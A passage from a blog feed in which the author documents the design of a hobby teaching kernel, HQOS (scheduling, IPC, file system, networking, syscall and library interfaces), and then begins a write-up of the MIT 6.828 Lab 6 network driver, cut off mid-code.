class="comment">//新进程的虚拟地址空间仅初始化了内核部分</span></span><br><span class="line"><span class="type">envid_t</span></span><br><span class="line"><span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="Process-scheduling"><a href="#Process-scheduling" class="headerlink" title="Process scheduling"></a>Process scheduling</h4><h5 id="Interface-3"><a href="#Interface-3" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For Kernel:</span></span><br><span class="line"><span class="comment">// Choose a user environment to run and run it.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sched_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sys_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation-2"><a href="#Implementation-2" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS的进程调度采用轮转调度(round robin).但目前还没有加入时间片的概念.每当时钟中断产生,时钟中断处理例程从当前进程在进程数组中的位置开始遍历其他进程,切换到下一个可运行状态的进程.若无其他可运行的进程,进程重启自身.内核进程不会因时钟中断发生调度(因为目前处理器在内核态时屏蔽中断).<br>进程当然也可主动让出处理器.</p><p>这样的实现当然是让人非常不满的,很快其将会重新实现.</p><h4 id="Interprocess-Communication-IPC"><a href="#Interprocess-Communication-IPC" class="headerlink" title="Interprocess Communication (IPC)"></a>Interprocess Communication (IPC)</h4><h5 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h5><p>HQOS支持多处理器,可能会有多个进程同时进入内核态.HQOS使用一个内核整体的Kernel Lock,进入内核时获取,离开内核时释放,也就是说,HQOS目前仅支持单个内核进程运行.这样的实现依赖于HQOS内核空间对所有进程而言是共享的.</p><h5 id="Sending-and-Receiving-Messages"><a href="#Sending-and-Receiving-Messages" class="headerlink" title="Sending and Receiving Messages"></a>Sending and Receiving Messages</h5><h6 id="By-Value"><a href="#By-Value" class="headerlink" title="By Value"></a>By Value</h6><p>通过用户进程可读的进程表(envs数组)来传递一字长的value.然而该value对所有进程都可见,且一字长的数据太短,所以一般用来辅助By page的传递方式.</p><h6 id="By-page"><a href="#By-page" class="headerlink" title="By page"></a>By page</h6><p>将sender的某页面映射到recver的虚拟地址空间中.<br>sender指示接收进程及页面权限.<br>recver指示将要映射到的虚拟地址.</p><p>recver阻塞直到sender将其唤醒.检测消息来源是否为期望的sender的工作由用户态调用者完成.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">uint32_t</span> value, <span class="type">void</span> *srcva, <span class="type">unsigned</span> perm)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *dstva)</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Threads-线程-待实现"><a href="#Threads-线程-待实现" class="headerlink" title="Threads 线程(待实现)"></a>Threads 线程(待实现)</h3><h2 id="File-systems"><a href="#File-systems" class="headerlink" title="File systems"></a>File systems</h2><h3 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h3><h4 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h4><p>磁盘每个扇区大小为512字节,HQOS使用的块大小为512字节.</p><h4 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h4><p>HQOS仅有一个超级块,位于磁盘1(第二个磁盘)的块1(第二个扇区).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FS_MAGIC0x53465148<span class="comment">// related vaguely to 'HQFS'</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> {</span></span><br><span class="line"><span class="type">uint32_t</span> s_magic;<span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line"><span class="type">uint32_t</span> s_nblocks;<span class="comment">// Total number of blocks on disk</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span><span class="comment">// Root directory node</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h4><p>文件的元数据保存在其所在的目录文件中.<br>f_direct数组中记录的为保存该文件数据的磁盘的块号(直接块).<br>f_indirect为间接块的块号,该块的数据为该文件对应的其他直接块的块号,相当于direct数组的扩展.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Number of block pointers in a File descriptor</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NDIRECT10</span></span><br><span class="line"><span class="comment">// Number of direct block pointers in an indirect block</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDIRECT(BLKSIZE / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> {</span></span><br><span class="line"><span class="type">char</span> f_name[MAXNAMELEN];<span class="comment">// filename</span></span><br><span class="line"><span class="type">off_t</span> f_size;<span class="comment">// file size in bytes</span></span><br><span class="line"><span class="type">uint32_t</span> f_type;<span class="comment">// file type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Block pointers.</span></span><br><span class="line"><span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line"><span class="type">uint32_t</span> f_direct[NDIRECT];<span class="comment">// direct blocks</span></span><br><span class="line"><span class="type">uint32_t</span> f_indirect;<span class="comment">// indirect block</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pad out to 256 bytes; must do arithmetic in case we're compiling</span></span><br><span class="line"><span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line"><span class="type">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">} __attribute__((packed));<span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Directories"><a href="#Directories" class="headerlink" title="Directories"></a>Directories</h4><p>保存文件的元数据,目录本身也是一个文件,其元数据保存在其上层目录中.根目录的内容保存在超级块中.</p><h3 id="File-System-Structure"><a href="#File-System-Structure" class="headerlink" title="File System Structure"></a>File System Structure</h3><h4 id="Disk-Access"><a href="#Disk-Access" class="headerlink" title="Disk Access"></a>Disk Access</h4><p>HQOS没有在内核中添加IDE磁盘驱动程序及相关系统调用,而是将其实现于用户态的文件系统中.文件系统进程使用了EFLAGS中的IOPL位,有权限执行IO指令.</p><h4 id="Block-Cache"><a href="#Block-Cache" class="headerlink" title="Block Cache"></a>Block Cache</h4><p>HQOS借助虚拟地址空间来实现块缓存.文件系统的DISKMAP(0x10000000 )至DISKMAP+DISKMAX(0xD0000000)用来缓存磁盘,共3GB空间,故HQOS仅支持3GB以下的磁盘.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return the virtual address of this disk block.</span></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">diskaddr</span><span class="params">(<span class="type">uint32_t</span> blockno)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (blockno == <span class="number">0</span> || (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks))</span><br><span class="line">panic(<span class="string">"bad block number %08x in diskaddr"</span>, blockno);</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*) (DISKMAP + blockno * BLKSIZE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>HQOS并不直接读取完整的3GB磁盘空间到地址空间中,而是当访问磁盘块所在页时,触发页面错误,由错误处理例程从磁盘中读入并完成映射.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fault any disk block that is read in to memory by</span></span><br><span class="line"><span class="comment">// loading it from disk.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">bc_pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br></pre></td></tr></tbody></table></figure><p>文件系统依赖页面的PTE_D(dirty)位来决定是否需要刷新块(写回到磁盘).</p><p>由于目前HQOS还未实现页面置换算法,我很担心Block Cache对内存的消耗.</p><h4 id="Block-Bitmap"><a href="#Block-Bitmap" class="headerlink" title="Block Bitmap"></a>Block Bitmap</h4><p>HQOS使用Bitmap来记录磁盘中Block的使用状态,进而完成分配释放等操作.</p><h3 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h3><p>文件系统接口是以进程间通信的方式提供的.文件系统持续无休止的接收其他进程的IPC请求,将请求调度到特定的处理例程,完成请求的文件操作.</p><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p>我暂时还不熟悉计算机网络相关知识,所以对Network部分的说明不会太多.</p><h3 id="Network-System"><a href="#Network-System" class="headerlink" title="Network System"></a>Network System</h3><p>这是HQOS网络体系的总览.HQOS使用E1000网卡,在Kernel中实现由E1000的驱动程序,负责将packet传给E1000或从E1000接收packet.与E1000驱动程序进行交互的是用户态的Network server,由核心网络进程、输出进程、输入进程构成.<br>核心网络进程的实现使用了开源的IwIP的TCP/IP协议套件.</p><p>其他用户进程通过IPC机制与Network server交互.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311152114274.png"></p><h2 id="System-calls-Interrupts-Exceptions"><a href="#System-calls-Interrupts-Exceptions" class="headerlink" title="System calls, Interrupts, Exceptions"></a>System calls, Interrupts, Exceptions</h2><p>实话说我不认为System calls, Interrupts, Exceptions的概念是与其他操作系统概念并列的,不过作为OS实现的重要部分,我需要单独的一章来说明,之前已经在其他操作系统概念的说明中介绍过的部分不再说明.</p><h3 id="Protected-Control-Transfer"><a href="#Protected-Control-Transfer" class="headerlink" title="Protected Control Transfer"></a>Protected Control Transfer</h3><h4 id="The-Interrupt-Descriptor-Table"><a href="#The-Interrupt-Descriptor-Table" class="headerlink" title="The Interrupt Descriptor Table"></a>The Interrupt Descriptor Table</h4><p>异常和中断导致处理器从用户模式切换到内核模式,内核模式的入口点和中断处理例程由内核明确规定.在HQOS中,所有的中断或异常都会导致切换到内核态,并由内核态进行处理(即使HQOS允许用户态页面错误处理例程,那也是先进入内核再由内核处理例程dispatch),这是在中断描述符表IDT中实现的.</p><p>HQOS目前仅支持中断门,意味着HQOS不支持嵌套中断.</p><h4 id="The-Task-State-Segment"><a href="#The-Task-State-Segment" class="headerlink" title="The Task State Segment"></a>The Task State Segment</h4><p>发生中断时,处理器将状态保存到TSS段中ESP3和SS3中,并加载ESP0和SS0,从内核返回是逆过程.HQOS目前仅使用TSS作为用户/内核堆栈的切换.HQOS目前为每个CPU分配了一个内核堆栈.</p><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// syscall.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">sys_cputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_cgetc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">sys_getenvid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_destroy</span><span class="params">(<span class="type">envid_t</span>)</span>;</span><br><span class="line"><span class="type">void</span><span class="title function_">sys_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">envid_t</span> <span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_status</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">int</span> status)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_trapframe</span><span class="params">(<span class="type">envid_t</span> env, <span class="keyword">struct</span> Trapframe *tf)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_pgfault_upcall</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *upcall)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> src_env, <span class="type">void</span> *src_pg,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dst_env, <span class="type">void</span> *dst_pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> value, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *rcv_pg)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sys_time_msec</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_tx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="User-library"><a href="#User-library" class="headerlink" title="User library"></a>User library</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exit.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pgfault.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">set_pgfault_handler</span><span class="params">(<span class="type">void</span> (*handler)(<span class="keyword">struct</span> UTrapframe *utf))</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// readline.c</span></span><br><span class="line"><span class="type">char</span>*<span class="title function_">readline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *buf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ipc.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">ipc_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> value, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">ipc_recv</span><span class="params">(<span class="type">envid_t</span> *from_env_store, <span class="type">void</span> *pg, <span class="type">int</span> *perm_store)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">ipc_find_env</span><span class="params">(<span class="keyword">enum</span> EnvType type)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fork.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>PTE_SHARE0x400</span></span><br><span class="line"><span class="type">envid_t</span><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fd.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">seek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">void</span><span class="title function_">close_all</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">readn</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Stat *statbuf)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> Stat *statbuf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// file.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> mode)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">ftruncate</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> size)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">remove</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sync</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pageref.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">pageref</span><span class="params">(<span class="type">void</span> *addr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sockets.c</span></span><br><span class="line"><span class="type">int</span>     <span class="title function_">accept</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">bind</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">shutdown</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> how)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">connect</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">listen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> backlog)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nsipc.c</span></span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_accept</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_bind</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_shutdown</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> how)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_close</span><span class="params">(<span class="type">int</span> s)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_connect</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_listen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> backlog)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_recv</span><span class="params">(<span class="type">int</span> s, <span class="type">void</span> *mem, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_send</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spawn.c</span></span><br><span class="line"><span class="type">envid_t</span><span class="title function_">spawn</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *program, <span class="type">const</span> <span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">spawnl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *program, <span class="type">const</span> <span class="type">char</span> *arg0, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">cputchar</span><span class="params">(<span class="type">int</span> c)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">iscons</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">opencons</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pipe.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefds[<span class="number">2</span>])</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">pipeisclosed</span><span class="params">(<span class="type">int</span> pipefd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wait.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">wait</span><span class="params">(<span class="type">envid_t</span> env)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sleep.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> ms)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">transpackt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">recvpackt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> max_bytes,<span class="type">int</span>* lenth_store)</span>;</span><br></pre></td></tr></tbody></table></figure><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><p><a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a><br><a href="https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf">Intel’s Software Developer’s Manual for the E1000</a></p>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> HQOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HQOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab6</title>
      <link href="/2023/6.828-Lab6/"/>
      <url>/2023/6.828-Lab6/</url>
      
        <content type="html"><![CDATA[<h2 id="Lab-6-Network-Driver"><a href="#Lab-6-Network-Driver" class="headerlink" title="Lab 6: Network Driver"></a>Lab 6: Network Driver</h2><h3 id="Part-A-Initialization-and-transmitting-packets"><a href="#Part-A-Initialization-and-transmitting-packets" class="headerlink" title="Part A: Initialization and transmitting packets"></a>Part A: Initialization and transmitting packets</h3><h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><p>在之前的时钟中断调度前加一个对time_tick函数的调用,注意时钟中断每个CPU都会收到,而我们的目的是计时,所以选择固定选择一个CPU来处理就好,bootcpu当然是最合适的.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET+IRQ_TIMER:</span><br><span class="line">lapic_eoi();</span><br><span class="line"><span class="keyword">if</span>(thiscpu==bootcpu)</span><br><span class="line">time_tick();</span><br><span class="line">sched_yield();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><h4 id="The-Network-Interface-Card"><a href="#The-Network-Interface-Card" class="headerlink" title="The Network Interface Card"></a>The Network Interface Card</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311131138871.png"></p><h5 id="PCI-Interface"><a href="#PCI-Interface" class="headerlink" title="PCI Interface"></a>PCI Interface</h5><p>现在要完成E1000作为一个PCI设备的识别和初始化</p><blockquote><p>The E1000 is a PCI device, which means it plugs into the PCI bus on the motherboard. The PCI bus has address, data, and interrupt lines, and allows the CPU to communicate with PCI devices and PCI devices to read and write memory. A PCI device needs to be discovered and initialized before it can be used. Discovery is the process of walking the PCI bus looking for attached devices. Initialization is the process of allocating I/O and memory space as well as negotiating the IRQ line for the device to use.</p></blockquote><blockquote><p> To perform PCI initialization during boot, the PCI code walks the PCI bus looking for devices. When it finds a device, it reads its vendor ID and device ID and uses these two values as a key to search the pci_attach_vendor array. </p><p>If the discovered device’s vendor ID and device ID match an entry in the array, the PCI code calls that entry’s attachfn to perform device initialization.</p></blockquote><p>在Software Developer’s Manual中找到E1000的vendor ID和device ID,为E1000声明一个用来attach的函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PCI_E1000_VENDOR_ID 0x8086</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCI_E1000_DEVICE_ID 0x100E</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func 